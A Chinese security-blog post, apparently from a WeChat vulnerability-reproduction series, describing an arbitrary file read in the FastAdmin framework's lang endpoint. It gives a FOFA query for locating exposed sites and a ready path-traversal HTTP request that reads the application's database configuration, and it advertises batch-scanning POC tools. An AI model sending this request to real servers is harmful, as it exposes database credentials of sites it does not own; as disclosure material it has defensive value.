#  fastAdmin开发框架lang接口存在任意文件读取漏洞 附POC   
南风漏洞复现文库  南风漏洞复现文库   2024-06-17 23:20  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. fastAdmin开发框架简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
FastAdmin 是一款基于PHP+Bootstrap开源后台框架  
## 2.漏洞描述  
  
FastAdmin 是一款基于PHP+Bootstrap开源后台框架,采用 Apache2 商业友好开源协议,FastAdmin 是专为开发者精心打造的一款开源后台框架,fastAdmin开发框架lang接口存在任意文件读取漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
fastAdmin开发框架  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YasoDTxjqXFdJtdXDC71SL0MUQSf3gK5lAHS49QjBk7gG9icP7nib8U4BneMhpQYGKNrhoyFXaEpcw/640?wx_fmt=jpeg&from=appmsg "null")  
  
fastAdmin开发框架lang接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
body="fastadmin.net" || body="<h1>fastadmin</h1>" && title="fastadmin"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xxx.xx/index/ajax/lang?lang=../../application/database  
  
漏洞数据包：  
```
GET /index/ajax/lang?lang=../../application/database HTTP/1.1
Host: xx.xx.xxx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YasoDTxjqXFdJtdXDC71SL9icmMt2CKLJloibibzyUicDNIQMzpO8K4DZo011ulfj4Nd2ibEtlPL9Bkow/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YasoDTxjqXFdJtdXDC71SLFfM08lLJ94nFMpNK5ot4z9tTMA9vjR5JIhbpdqFLkwf88RE6ibjXXGA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YasoDTxjqXFdJtdXDC71SLMdBKpalhu4l3GBwZVJc4Kjjk7qPsMMNtwto1KGjBHsN5gWYdLzQiaRA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YasoDTxjqXFdJtdXDC71SLYI6qyQ1A16V8H3RicRIArIAxAmWdvMnlib4Dc9fUVLbJ1L2PXsScwvVg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YasoDTxjqXFdJtdXDC71SLC7bqEMHfpl7nr0cib29Qk8u7GHanRuzbKjSZNwbRHichGDXyOzdY3BOg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YasoDTxjqXFdJtdXDC71SL1XvQS89rkK3wtiaTfcVwqqJOPcD8ib4bVnGznUt8nsnkvFnc4wcQm0Sw/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
[SolarWinds Serv-U 存在任意文件读取漏洞CVE-2024-28995 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486565&idx=1&sn=3098a6002a5d0a8628cb46638b3fb250&chksm=974b8162a03c0874c26ddbf9ba47adae23ea26a602d126e88b49fedabc6c44fa191db4cd8984&scene=21#wechat_redirect)  
  
  
[Rejetto HTTP File Server 存在远程命令执行漏洞CVE-2024-23692 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486551&idx=1&sn=1c2c8960ddcdd696338beedc9da53ad0&chksm=974b8150a03c08463be876fe253efa292e39f4323af3e930d228dc4cc9bdd17c4e1f304a877a&scene=21#wechat_redirect)  
  
  
